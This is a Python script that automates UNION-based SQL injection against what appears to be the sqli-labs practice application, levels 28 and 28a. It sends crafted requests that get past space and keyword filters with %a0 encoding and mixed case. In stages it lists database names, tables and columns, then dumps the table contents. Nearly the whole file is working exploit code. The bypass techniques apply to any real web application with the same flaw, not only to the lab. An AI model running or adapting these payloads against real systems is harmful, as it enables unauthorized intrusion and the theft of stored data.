import requests
from bs4 import BeautifulSoup


class Less28_Less28a(object):

    def __init__(self,url,level,dbs,tables,columns,schema,d,t,c,a):

        if url[-1] == "/":

            self.url = url

        else:

            self.url = url + "/"

        self.level = level

        self.dbs = dbs

        self.tables = tables

        self.columns = columns            # 初始化

        self.schema = schema

        self.d = d

        self.t = t

        self.c = c

        self.a = a





    def soup(self,text):

        soup = BeautifulSoup(text,"html5lib")    # 筛选数据

        strings = soup.find_all('font')[2].text

        return strings.split("You")[1].split(":")[1].split(",")




    def dbs_payload(self):

        if self.level == 28 and self.a:   # level 28a payload

            rep = requests.get(self.url+"?id=0')%a0unIon%a0SelEct%a01,(SelEct%a0group_concat(schema_name)%a0from%a0information_schema.schemata),3||('1")

            print(self.soup(rep.text))

                                # level 28 payload

        elif self.level == 28 and not self.a:

            rep = requests.get(self.url+"?id=0')union%a0select(1),(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),(3)||('1")

            print(self.soup(rep.text))



    def tables_payload(self):

        if self.level == 28 and self.a: # 28a payload

            rep = requests.get(self.url+"?id=0')%a0unIon%a0SelEct%a01,(SelEct%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='"+self.d+"'),3||('1")

            print(self.soup(rep.text))


        elif self.level == 28 and not self.a:           # 28 payload

            rep = requests.get(self.url+"?id=0')union%a0select(1),(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='"+self.d+"'),(3)||('1")

            print(self.soup(rep.text))




    def columns_payload(self):

        if self.level == 28 and self.a: # 28a payload

            rep = requests.get(self.url+"?id=0')%a0unIon%a0SelEct%a01,(SelEct%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_schema='"+self.d+"'%a0and%a0table_name='"+self.t+"'),3||('1")

            print(self.soup(rep.text))

        elif self.level == 28 and not self.a:  # 28 payload

            rep = requests.get(self.url+"?id=0')%a0union%a0select%a0(1),(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_schema='"+self.d+"'%a0and%a0table_name='"+self.t+"'),(3)||('1")

            print(self.soup(rep.text))



    def data_payload(self):

        if self.level == 28 and self.a:  # 28a payload

            rep = requests.get(self.url+"?id=0')%a0unIon%a0SelEct%a01,(SelEct%a0group_concat("+self.c+")%a0from%a0"+self.d+"."+self.t+"),3||('1")

            print(self.soup(rep.text))


        elif self.level == 28 and not self.a:      # 28 payload

            rep = requests.get(self.url+"?id=0')%a0union%a0select%a0(1),(select%a0group_concat("+self.c+")%a0from%a0"+self.d+"."+self.t+"),(3)||('1")

            print(self.soup(rep.text))



    def DBS(self):

        self.dbs_payload()


    def TABLES(self):           # 使用对应的payload

        self.tables_payload()


    def COLUMNS(self):

        self.columns_payload()


    def SCHEMA(self):

        self.data_payload()


    def TYPE(self):

        if self.dbs and not self.tables and not self.columns and not self.schema:  # 如果枚举数据库被设置

            self.DBS()

        elif self.d != '' and self.tables and not self.columns and not self.schema: # 如果枚举表和数据库名被设置

            self.TABLES()

        elif self.t != '' and self.columns and self.d != '' and not self.schema and not self.dbs and not self.tables: # 如果枚举列,和数据表,和数据列被设置

            self.COLUMNS()

        elif self.c != '' and self.t != '' and self.d != '' and self.schema and not self.dbs and not self.tables and not self.columns: # 如果数据表,数据库,数据列被设置

            self.SCHEMA()

        else:

            print("wrong options and bad type!")



    def Less_28(self):
        self.TYPE()
        

                              # 调用对应的level 等级
    def Less_28a(self):
        self.TYPE()

